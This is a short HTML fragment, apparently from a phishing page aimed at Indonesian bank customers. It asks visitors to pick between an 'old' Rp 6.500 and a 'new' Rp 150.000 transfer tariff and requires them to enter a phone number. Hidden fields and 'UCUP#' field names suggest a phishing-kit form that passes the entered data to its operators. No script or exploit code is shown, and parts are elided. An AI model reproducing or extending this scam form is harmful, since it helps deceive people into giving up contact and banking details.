...
<meta content="ast/4mi0e0.jpg" property="og:image">
<meta name="twitter:image" content="ast/4mi0e0.jpg">
...
<input type="hidden" name="desc" value="NoHP">
<input type="hidden" name="formid" value="index">
<input type="hidden" name="merge" value="index">
        <center><img style="width:93%;border-radius:5px;margin-top:10px;margin-bottom:8px;" src="ast/taobkv.png" alt=""></center>
       <div class="radio-group">             
    <input type="radio" id="1" name="UCUP#Tarif" value="Lama Rp 6.500" required>
    <label class="label-radio" for="1">√•𝗧𝗮𝗿𝗶𝗳 𝗟𝗮𝗺𝗮 𝗥𝗽 𝟲.𝟱𝟬𝟬 / 𝗕𝗶 𝗳𝗮𝘀𝘁 𝟮.𝟱𝟬𝟬</label>

    <input type="radio" id="2" name="UCUP#Tarif" value="Baru Rp 150.000" required>
 ...
 <input type="tel" id="nohp" name="UCUP#No_HP" placeholder="08xxxx" maxlength="15" required>
                        </div>
                    </div>
